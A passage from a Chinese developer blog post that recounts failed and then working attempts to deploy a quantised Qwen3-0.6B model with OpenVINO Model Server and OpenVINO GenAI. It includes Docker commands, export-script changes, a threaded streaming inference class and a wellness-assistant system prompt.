<pre><code class="hljs language-bash" lang="bash">2025-11-28 14:50:36 error parsing options - unmatched arguments: --reasoning_parser, qwen3, 
</code></pre>
<p>What？</p>
<p>不是说 reasoning_parser 参数可以用的吗？之后我又尝试将 reasoning_parser 放入环境变量。虽说没有报错了，但思考链没有生效。既然解决不了就先放下，于是得到以下命令：</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
-p 8000:8000 \
-p 9000:9000 \
-v &lt;int4_path&gt;/models:/models \
openvino/model_server:latest \
--model_path /models/model1 \
--model_name Qwen3-0.6R \
--rest_port 8000 \
--port 9000 
</code></pre>
<p>这里需要着重说明的是，参数里挂载目录传参和 model_path 参数之间的关系。首先 OVMS 使用的模型一定要是 IR 模型（我猜的，毕竟我只有 IR 模型运行成功了），因此 &lt;int4_path&gt; 要填写量化后导出的 int4 模型路径。但为什么后面要有一个 models 呢？这是为了配合 model_path 参数使用的需要。目录结构如下：</p>
<pre><code class="hljs language-bash" lang="bash">OpenVINOModel
└── INT4
    └── models
        └── model1
            └── 1
                ├── config.json
                ├── generation_config.json
                ├── openvino_config.json
                ├── openvino_detokenizer.bin
                ├── openvino_detokenizer.xml
                ├── openvino_model.bin
                ├── openvino_model.xml
                ├── openvino_tokenizer.bin
                └── openvino_tokenizer.xml
</code></pre>
<p>由于 OVMS 启动时会扫描 model_path 路径下的目录（/models/model1），其中 /models 是固定项，这个属于挂载点。下一级目录 model1 可以是任意的名字，但再下级就需要一个名为 1 的文件夹。这个 1 代表的是模型的版本（version），如果缺失了这个目录，就会一直报找不到版本（No version found for model in path）。</p>
<p>而 docker 命令中 model_name 是为了调用时有一个明确的 model 指向，因此为了不与 0.6B 混淆，这里就重命名为 0.6R。</p>
<p>至此，docker 的 OVMS 应该就能启动成功了（docker logs 看一下就知道了）。</p>
<p>在浏览器输入地址 <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8000%2Fv1%2Fconfig" target="_blank" title="http://localhost:8000/v1/config" ref="nofollow noopener noreferrer">http://localhost:8000/v1/config</a> 就能够查看模型加载效果</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"Qwen3-0.6R"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"model_version_status"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"AVAILABLE"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"error_code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"OK"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"error_message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"OK"</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>好了，服务部署好了就尝试推理吧。</p>
<p>写一个 Python 脚本试试多轮对话：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json

base_url=<span class="hljs-string">"http://localhost:8000/v3/chat/completions"</span>
headers = {
    <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>
}
payload = {
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"Qwen3-0.6R"</span>,
    <span class="hljs-string">"stream"</span>: <span class="hljs-literal">False</span>,
    <span class="hljs-string">"messages"</span>: [
        {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你是一名专业的中医药知识问答质量评估员。"</span>},
        {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"请详细分析一下中医理论中'阴阳'的概念，并给出思考过程。"</span>}
    ]
}

response = requests.request(<span class="hljs-string">"POST"</span>, base_url, json=payload, headers=headers)
<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
    results = json.loads(response.text)[<span class="hljs-string">"results"</span>]
    <span class="hljs-built_in">print</span>(results)
</code></pre>
<p>返回的结果如下：</p>
<pre><code class="hljs language-python" lang="python">openvino Error code: <span class="hljs-number">404</span> - {<span class="hljs-string">'error'</span>: <span class="hljs-string">'Mediapipe graph definition with requested name is not found'</span>}
</code></pre>
<p>对此官方文档给出提示</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cf7be6e5bb842b991bc32c81e68e04c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=1L5slmeAnI%2BbRyvtn4in4jIV%2FXU%3D" alt="" loading="lazy"/></p>
<p>是的，我明白还需要 graph.pbtxt 这个文件了。但是我的 IR 导出并没有将 graph.pbtxt 生成出来。</p>
<p>那么 graph.pbtxt 我要在哪里才能够找到呢？经过一番寻找最终在 Github 的某一个 Issus 中找到了答案。</p>
<p>需要先访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenvinotoolkit%2Fmodel_server.git" target="_blank" title="https://github.com/openvinotoolkit/model_server.git" ref="nofollow noopener noreferrer">github.com/openvinotoo…</a> 项目中找到 demos -&gt; continuous_batching -&gt; graph.pbtxt。找到 graph.pbtxt 后下载并拷贝到 &lt;int4_path&gt;/models/model1/1 目录下跟 int4 量化模型放在一起就可以了。如下图：</p>
<pre><code class="hljs language-python" lang="python">OpenVINOModel
└── INT4
    └── models
        └── model1
            └── <span class="hljs-number">1</span>
                ├── config.json
                ├── graph.pbtxt
                ├── generation_config.json
                ├── openvino_config.json
                ├── openvino_detokenizer.<span class="hljs-built_in">bin</span>
                ├── openvino_detokenizer.xml
                ├── openvino_model.<span class="hljs-built_in">bin</span>
                ├── openvino_model.xml
                ├── openvino_tokenizer.<span class="hljs-built_in">bin</span>
                └── openvino_tokenizer.xml
</code></pre>
<p>就这样 OVMS 启动时就能扫描到了。</p>
<p>好了，现在再试试调用吧。结果...</p>
<pre><code class="hljs language-bash" lang="bash">Mediapipe execution failed. MP status - INVALID_ARGUMENT: CalculatorGraph::Run() failed: \\nCalculator::Process() <span class="hljs-keyword">for</span> node \\"LLMExecutor\\" failed: This servable accepts only single message requests
</code></pre>
<p>What？This servable accepts only single message requests？不是吧，只支持单次推理？（这里有点搞不懂了，可能是我的 graph.pbtxt 有问题吧，因为之后我尝试过直接用 Optimum Intel 驱动导出的 IR 模型是可以多轮问答的）</p>
<p>OK，就目前这种情况其实就能放弃这个方案了，但为了追求真相我们还是换成单次推理试试：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json

base_url=<span class="hljs-string">"http://localhost:8000/v3/completions"</span>
headers = {
    <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>
}
payload = {
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"Qwen3-0.6R"</span>,
    <span class="hljs-string">"stream"</span>: <span class="hljs-literal">False</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"你是一名专业的中医药知识问答质量评估员。请详细分析一下中医理论中'阴阳'的概念，并给出思考过程。"</span>
}

response = requests.request(<span class="hljs-string">"POST"</span>, base_url, json=payload, headers=headers)
<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
    results = json.loads(response.text)[<span class="hljs-string">"results"</span>]
    <span class="hljs-built_in">print</span>(results)
</code></pre>
<p>这次 OVMS 确实接收到请求了，但是... CPU 一直拉升并且超长时间内没有响应，如下图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8e57e8180b44742a832a4bcc4e69972~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=Q%2BogKWzrq4o9e%2FG3ECuIpDR6jX0%3D" alt="" loading="lazy"/></p>
<p>之后足足等了 6 分钟还是没有输出。这台 Mac 的 CPU 分配给 docker 的拢共就只能走 400%，等待的时间内一直被占满，最后实在没有办法了就中断了启动试验。</p>
<pre><code class="hljs language-bash" lang="bash">2025-11-28 13:47:30 [2025-11-28 05:47:30.483][84][llm_executor][info][llm_executor.hpp:66] All requests: 1; Scheduled requests: 1; Cache usage 0.1%;
...
2025-11-28 13:53:53 [2025-11-28 05:53:53.597][84][llm_executor][info][llm_executor.hpp:66] All requests: 1; Scheduled requests: 1; Cache usage 4.2%;
</code></pre>
<p>也许是我的配置有问题，也可能是我的硬件设备已经不支持这套方案了...也许这套方案在其他硬件或者配置下会有所改善，但就我目前的情况来看是走不通的。</p>
<h3 data-id="heading-3">2.OpenVINO GenAI 推理</h3>
<h4 data-id="heading-4">2.1 OVMS 导出模型</h4>
<p>既然 OVMS 走不通，那么我们就选择另一种推理方式 GenAI。</p>
<p>为什么选择 GenAI？这就要说说它与 Optimum Intel 之间的区别。</p>
<p>简单来说，Optimum Intel 更适合从 Huggingface 生态平滑迁移的开发者，而 GenAI 则提供了更高性能、更低依赖的本地化部署选择。</p>
<p>之前之所以使用 Optimum Intel 是因为那时刚刚接触模型开发，在接触 OpenVINO 之前就已经写好了本地基于 Huggingface 的 Qwen1.5 推理底座了。为了能够平滑过度到 CPU 驱动的高性能方案才使用的 Optimum Intel。但这次我们是以性能有限，因此重新选择了对 C++ 更为友好的 GenAI 解决方案。</p>
<p>此外，还有一个原因是后续我有可能会自己开发一个具有边缘推理能力的 APP，这时候 GenAI 就派上用场了（毕竟依赖极少，轻量化且有完整的文本生成流水线，这些对于边缘算力来说是非常重要的）。</p>
<p>ε=(´ο｀*)))唉扯远了，回归主题。</p>
<p>在 OVMS 方案中我们使用 SDK 导出 IR 模型时其实是有缺失的情况出现的。这次我们使用官方推荐的导出方式 export_model.py。我在 Github 中找到 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenvinotoolkit%2Fmodel_server%2Ftree%2Fmain%2Fdemos%2Fcommon%2Fexport_models" target="_blank" title="https://github.com/openvinotoolkit/model_server/tree/main/demos/common/export_models" ref="nofollow noopener noreferrer">openvinotoolkit</a> 项目，并下载 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenvinotoolkit%2Fmodel_server%2Fblob%2Fmain%2Fdemos%2Fcommon%2Fexport_models%2Fexport_model.py" target="_blank" title="https://github.com/openvinotoolkit/model_server/blob/main/demos/common/export_models/export_model.py" ref="nofollow noopener noreferrer">export_model.py</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenvinotoolkit%2Fmodel_server%2Fblob%2Fmain%2Fdemos%2Fcommon%2Fexport_models%2Frequirements.txt" target="_blank" title="https://github.com/openvinotoolkit/model_server/blob/main/demos/common/export_models/requirements.txt" ref="nofollow noopener noreferrer">requirements.txt</a> 两个文件。下载下来后先安装 requirements.txt ，然后在 step2_export_openvino_model.py 中加入 export_model.py 导出的适配代码，如下图：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">export_with_ovms_script</span>(<span class="hljs-params">self</span>):
    <span class="hljs-comment"># 读取 requirements.txt 文件并进行安装</span>
    export_script_path = self.install_ovms_depend()

    <span class="hljs-comment"># 设置 config.json 文件的导出路径</span>
    config_path = os.path.join(self.openvino_model, <span class="hljs-string">'config_all.json'</span>)
    
    <span class="hljs-comment"># 构建结构化的 OVMS 导出脚本</span>
    cmd = [
        sys.executable, export_script_path,
        <span class="hljs-string">'text_generation'</span>,
        <span class="hljs-string">'--source_model'</span>, self.unsloth_merge_model_dir,
        <span class="hljs-string">'--model_repository_path'</span>, self.openvino_ovms_model_dir,
        <span class="hljs-string">'--model_name'</span>, self.model_name,
        <span class="hljs-string">'--weight-format'</span>, self.weight_format,
        <span class="hljs-string">'--target_device'</span>, self.target_device,
        <span class="hljs-string">'--config_file_path'</span>, config_path,
        <span class="hljs-string">'--cache_size'</span>, <span class="hljs-built_in">str</span>(self.cache_size),
        <span class="hljs-string">'--max_num_seqs'</span>, <span class="hljs-built_in">str</span>(self.max_num_seqs),
        <span class="hljs-string">'--max_num_batched_tokens'</span>, <span class="hljs-built_in">str</span>(self.max_num_batched_tokens),
        <span class="hljs-string">'--reasoning_parser'</span>, self.reasoning_parser,
        <span class="hljs-string">'--extra_quantization_params'</span>, <span class="hljs-string">'--sym --group-size 128'</span>
    ]
    
    <span class="hljs-comment"># 根据 enable_prefix_caching 配置决定是否加上 --enable_prefix_caching 参数</span>
    <span class="hljs-keyword">if</span> self.enable_prefix_caching:
        cmd.append(<span class="hljs-string">'--enable_prefix_caching'</span>)
    
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 运行导出</span>
            result = subprocess.run(cmd, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>, check=<span class="hljs-literal">True</span>)
            <span class="hljs-comment"># 如果出现 warning 和 error 就进行输出</span>
            <span class="hljs-keyword">if</span> result.stderr:
                logger.warning(<span class="hljs-string">f"OVMS export stderr: <span class="hljs-subst">{result.stderr}</span>"</span>)
            
            <span class="hljs-comment"># 设置导出状态为 True</span>
            self.ovms_exported = <span class="hljs-literal">True</span>
            logger.info(<span class="hljs-string">"OVMS export completed successfully"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<p>导出后的文件目录如下：</p>
<pre><code class="hljs language-bash" lang="bash">OVMS
`-- qwen3-reasoning
    |-- added_tokens.json
    |-- chat_template.jinja
    |-- config.json
    |-- generation_config.json
    |-- graph.pbtxt
    |-- merges.txt
    |-- openvino_detokenizer.bin
    |-- openvino_detokenizer.xml
    |-- openvino_model.bin
    |-- openvino_model.xml
    |-- openvino_tokenizer.bin
    |-- openvino_tokenizer.xml
    |-- special_tokens_map.json
    |-- tokenizer.json
    |-- tokenizer_config.json
    `-- vocab.json
</code></pre>
<p>但是...</p>
<p>如果直接使用官方提供的 export_model.py 脚本导出是会出现报错的。如下图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdd8329dcb96410685f0023ae29ca0b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=yIKLPOgsyLuAan1HqAmhsdc236k%3D" alt="" loading="lazy"/></p>
<p>让我们来对照一下 export_model.py 源码和 huggingface 的说明文档。通过上面报错我们可以定位到导出语句：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fdb2620b59447399157caf71c59acab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=cQ96VWKnLzFlXn41aZf5eEUHBb4%3D" alt="" loading="lazy"/></p>
<p>可以看到在 export_model.py 中导出依然采用的是 optimum-cli export。而关于 optimum-cli export 我们早已在 huggingface 中看过：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhf-mirror.com%2Fdocs%2Foptimum-intel%2Fopenvino%2Fexport" target="_blank" title="https://hf-mirror.com/docs/optimum-intel/openvino/export" ref="nofollow noopener noreferrer">hf-mirror.com/docs/optimu…</a></p>
<pre><code class="hljs language-bash" lang="bash">usage: optimum-cli <span class="hljs-built_in">export</span> openvino [-h] -m MODEL [--task TASK] [--framework {pt}] [--trust-remote-code]
                                   [--weight-format {fp32,fp16,int8,int4,mxfp4,nf4,cb4}]
                                   [--quant-mode {int8,f8e4m3,f8e5m2,cb4_f8e4m3,int4_f8e4m3,int4_f8e5m2}]
                                   [--library {transformers,diffusers,timm,sentence_transformers,open_clip}]
                                   [--cache_dir CACHE_DIR] [--pad-token-id PAD_TOKEN_ID] [--ratio RATIO] [--sym]
                                   [--group-size GROUP_SIZE] [--backup-precision {none,int8_sym,int8_asym}]
                                   [--dataset DATASET] [--all-layers] [--awq] [--scale-estimation] [--gptq]
                                   [--lora-correction] [--sensitivity-metric SENSITIVITY_METRIC]
                                   [--quantization-statistics-path QUANTIZATION_STATISTICS_PATH]
                                   [--num-samples NUM_SAMPLES] [--disable-stateful] [--disable-convert-tokenizer]
                                   [--smooth-quant-alpha SMOOTH_QUANT_ALPHA]
                                   output

optional arguments:
  -h, --<span class="hljs-built_in">help</span>            show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span>
...
</code></pre>
<p>通过对比发现在 export_model.py 中缺少了 --task 参数，这样的话 optimum-cli export 是无法知道你要导出的是什么类型的。为此，我们还需要修改一下 export_model.py 源码。如下图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85343044cdd14ddeb3e80da0d3d88a81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=i1YyI1LHZp8ZrGg02zYV6sEXqEY%3D" alt="" loading="lazy"/></p>
<p>这样才能够正常导出。</p>
<h4 data-id="heading-5">2.2 GenAI 推理</h4>
<p>模型导出后我们将使用 GenAI 管道的方式加载模型并实现推理。</p>
<p>整体代码我全部写在 step3_openvino_runtime.py 脚本中了，各位感兴趣可以自行 Checkout 下来阅读。在这里我只说代码中几个重点实现。</p>
<h5 data-id="heading-6">2.2.1. 线程、队列与生成器（异步流式处理模式）</h5>
<p>代码中采用了 Python 异步 I/O 密集型任务的经典模式：<strong>生产者-消费者模型。</strong></p>
<p>通过 threading.Lock 确保 OpenVINO 推理过程是互斥的。blocking=False 实现了<strong>非阻塞</strong>的系统繁忙检测：当有任务正在运行时，新请求会被快速拒绝（返回 "系统繁忙"），而不是排队阻塞，这极大地提高了服务的响应速度和稳定性。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfor_stream_msg</span>(<span class="hljs-params">
        self,
        msg: <span class="hljs-type">Union</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]],
        **kwargs
    </span>) -&gt; Generator[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>], <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>]:
    
    <span class="hljs-comment"># 检查是否线程繁忙</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> OpenvinoRuntime._inference_lock.acquire(blocking=<span class="hljs-literal">False</span>):
        logger.warning(<span class="hljs-string">"Inference request denied: System is busy."</span>)
        <span class="hljs-keyword">yield</span> {<span class="hljs-string">"content"</span>: <span class="hljs-string">"系统繁忙，请稍后再试，CPU资源已被占用。"</span>,<span class="hljs-string">"finished"</span>: <span class="hljs-literal">True</span>,<span class="hljs-string">"stop_reason"</span>: <span class="hljs-string">"busy_lock"</span>}
        <span class="hljs-keyword">return</span>

    <span class="hljs-keyword">try</span>:
            prompt = self._build_prompt(msg)
            early_stop_cfg = self.config[<span class="hljs-string">"early_stop"</span>]
            timeout = kwargs.get(<span class="hljs-string">"timeout_seconds"</span>, early_stop_cfg[<span class="hljs-string">"timeout_seconds"</span>])

            <span class="hljs-comment"># 初始化生产者</span>
            token_queue: Queue = Queue()
            streamer = ChunkingStreamer(
                token_queue=token_queue,
                stop_strings=self.stop_strings,
                timeout_seconds=timeout,
                chunk_size=<span class="hljs-number">15</span>, 
            )
</code></pre>
<p>而 Queue.Queue 是生产者（后台推理线程）和消费者（主生成器线程）之间的数据通道。它在线程安全的环境下缓存生成的 Subword，解耦了推理速度与消费速度。</p>
<p>将耗时的 self.pipe.generate(...) 放在一个独立的后台线程 run_generation 中运行。这使得主线程能够立即从队列中消费数据并 yield，避免了阻塞，实现了真正的异步流式输出。</p>
<pre><code class="hljs language-python" lang="python">...
    <span class="hljs-comment"># 初始化错误数组用于存放生成错误</span>
    generation_error = [<span class="hljs-literal">None</span>]
    
    <span class="hljs-comment"># 持续推理函数</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_generation</span>():
        <span class="hljs-keyword">try</span>:
            
            <span class="hljs-comment"># GenAI 管道推理</span>
            self.pipe.generate(prompt, gen_config, streamer)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            generation_error[<span class="hljs-number">0</span>] = e
            logger.error(<span class="hljs-string">f"Generation error: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">finally</span>:
            streamer.end()

    <span class="hljs-comment"># 独立线程运行</span>
    gen_thread = threading.Thread(target=run_generation, daemon=<span class="hljs-literal">True</span>)
    gen_thread.start()

...
</code></pre>
<h5 data-id="heading-7">2.2.2. 模型定制与高效停止机制</h5>
<p>针对康养、大健康、药食同源做了严格的提示词约束。</p>
<pre><code class="hljs language-python" lang="python">SYSTEM_PROMPT_TCM = <span class="hljs-string">"""
        你是康养问答助手。

        【强制规则】
        1. 只用中文回答，禁止英文
        2. 禁止使用任何符号：' " ` * # @ $ % ^ &amp; ( ) [ ] { } &lt; &gt; / \ | ~
        3. 标点只用：，。、！？
        4. 回答完毕输出【EOA】后立即停止

        【输出格式】
        【证型】具体证型名称
        【调理】分点建议
        【EOA】

        【举例】
        问题：经常头晕乏力，脸色发白
        回答：
        【证型】气血两虚证
        【调理】一、饮食方面，多吃红枣、桂圆、枸杞煮粥，每周炖一次乌鸡汤或猪肝汤补血
            二、作息方面，晚上十一点前入睡，午休半小时
            三、运动方面，每天散步二十分钟，不宜剧烈运动
        【EOA】
        
        注意：禁止输出英文单词。禁止输出特殊符号。
        """</span>
</code></pre>
<p>在提示词中强制要求回答结束后输出 【EOA】，并将其加入 stop_strings。模型一旦生成此标记，ChunkingStreamer 会立即切断生成，避免了不必要的 token 生成和计算浪费。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OpenvinoRuntime</span>:

    ...

    DEFAULT_CONFIG = {
       ...

        <span class="hljs-comment"># 停止关键字</span>
        <span class="hljs-string">"stop_strings"</span>: [
            <span class="hljs-string">"&lt;|im_end|&gt;"</span>,
            <span class="hljs-string">"&lt;|endoftext|&gt;"</span>,
            <span class="hljs-string">"&lt;|im_start|&gt;"</span>,
            <span class="hljs-string">"\n\n\n"</span>,
            <span class="hljs-string">"【EOA】"</span>,
            <span class="hljs-string">"\nUser:"</span>,
            <span class="hljs-string">"\nuser:"</span>,
            <span class="hljs-string">"Human:"</span>,
            <span class="hljs-string">"Assistant:"</span>,
        ]
    }
    ...

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ChunkingStreamer</span>:
    
    ...

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_stop_and_trim</span>(<span class="hljs-params">self, stop_str: <span class="hljs-built_in">str</span>, last_subword: <span class="hljs-built_in">str</span></span>):
        
        <span class="hljs-comment"># 获取完整分段字符串</span>
        full_check_string = self.buffer + last_subword

        <span class="hljs-comment"># 字符串中查找词停关键字并获取位置</span>
        stop_pos = full_check_string.find(stop_str)
        <span class="hljs-keyword">if</span> stop_pos != -<span class="hljs-number">1</span>:
            
            <span class="hljs-comment"># 定位到字符串词停为止并获取在此之前的全部字符串内容</span>
            content_to_send = full_check_string[:stop_pos]
            <span class="hljs-keyword">if</span> content_to_send:
                
                <span class="hljs-comment"># 将需要返回的字符串放入数据通道</span>
                self.token_queue.put(content_to_send)
                
            <span class="hljs-comment"># 更新字符缓存区和获取内容</span>
            current_buffer_len = <span class="hljs-built_in">len</span>(self.buffer)
            self.generated_text = self.generated_text[:<span class="hljs-built_in">len</span>(self.generated_text) - current_buffer_len] + content_to_send
            self.buffer = <span class="hljs-string">""</span>
        
        <span class="hljs-comment"># 停止继续输出</span>
        self._request_stop(<span class="hljs-string">f"stop_string: <span class="hljs-subst">{stop_str}</span>"</span>)

</code></pre>
<h5 data-id="heading-8">2.2.3. ChunkingStreamer 的三重防御与平滑输出</h5>
<p>上面已经浅浅提到了 ChunkingStreamer，其实 ChunkingStreamer 实现流式体验和数据清洗的核心模块，它同时处理了过滤、缓冲和停止。</p>
<p><em><strong>2.2.3.1 关于  标签的过滤</strong></em></p>
<p>在 <strong>call</strong> 方法内，通过一个 while 循环实现状态机</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, subword: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
        <span class="hljs-comment"># 先检查是否已处于停止信号已发送状态，若是则中断输出</span>
        <span class="hljs-keyword">if</span> self.stop_requested.is_set():
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        
        <span class="hljs-comment"># 检查输出是否超时，超时则中断输出</span>
        <span class="hljs-keyword">if</span> time.time() - self.start_time &gt; self.timeout_seconds:
            self._flush_buffer_and_stop(<span class="hljs-string">"timeout"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># 将输出词赋值给 processed_subword</span>
        processed_subword = subword
        
        <span class="hljs-comment"># 状态机设置</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">if</span> self.in_thought_mode:
                
                <span class="hljs-comment"># 寻找&lt;/think&gt;标签</span>
                end_pos = processed_subword.find(THINK_END_TAG)
                <span class="hljs-keyword">if</span> end_pos == -<span class="hljs-number">1</span>:
                    <span class="hljs-comment"># 找不到返回 False</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-comment"># 找到了就退出思考模式</span>
                    self.in_thought_mode = <span class="hljs-literal">False</span>
                    processed_subword = processed_subword[end_pos + <span class="hljs-built_in">len</span>(THINK_END_TAG):]
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> processed_subword: <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            <span class="hljs-keyword">else</span>:
                <span class="hljs-comment"># 找&lt;think&gt;标签</span>
                start_pos = processed_subword.find(THINK_START_TAG)
                <span class="hljs-comment"># 若没有找到则不用找了直接跳出状态机</span>
                <span class="hljs-keyword">if</span> start_pos == -<span class="hljs-number">1</span>:
                    <span class="hljs-keyword">break</span>
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-comment"># 找到的话就开始设值</span>
                    safe_content = processed_subword[:start_pos]
                    <span class="hljs-keyword">if</span> safe_content:
                        self.buffer += safe_content
                        self.generated_text += safe_content
                        self.token_count += <span class="hljs-number">1</span>

                    self.in_thought_mode = <span class="hljs-literal">True</span>
                    processed_subword = processed_subword[start_pos + <span class="hljs-built_in">len</span>(THINK_START_TAG):]
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> processed_subword: <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        
        <span class="hljs-comment"># 检查输出词是否具有词停关键字</span>
        temp_text = self.buffer + processed_subword
        <span class="hljs-keyword">for</span> stop_str <span class="hljs-keyword">in</span> self.stop_strings:
            <span class="hljs-keyword">if</span> stop_str <span class="hljs-keyword">in</span> temp_text:
                self._stop_and_trim(stop_str, processed_subword.strip())
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># 经过了以上检查后，没有问题了就可以将输出词放入缓冲区</span>
        self.buffer += processed_subword
        self.generated_text += processed_subword
        self.token_count += <span class="hljs-number">1</span>

        <span class="hljs-comment"># 如果缓冲区内字符大于预设置</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.buffer) &gt;= self.chunk_size:
            <span class="hljs-comment"># 找到最后一个缓冲的词</span>
            split_pos = -<span class="hljs-number">1</span>
            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> self.punctuation:
                pos = self.buffer.rfind(p)
                <span class="hljs-keyword">if</span> pos &gt; split_pos:
                    split_pos = pos

            <span class="hljs-comment"># 将所有缓存区的内容发送到数据通道</span>
            content_to_send = <span class="hljs-string">""</span>
            <span class="hljs-keyword">if</span> split_pos != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(self.buffer) - (split_pos + <span class="hljs-number">1</span>) &lt; self.chunk_size:
                content_to_send = self.buffer[:split_pos + <span class="hljs-number">1</span>]
                self.buffer = self.buffer[split_pos + <span class="hljs-number">1</span>:]
            <span class="hljs-keyword">else</span>:
                content_to_send = self.buffer[:self.chunk_size]
                self.buffer = self.buffer[self.chunk_size:]
            self.token_queue.put(content_to_send)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
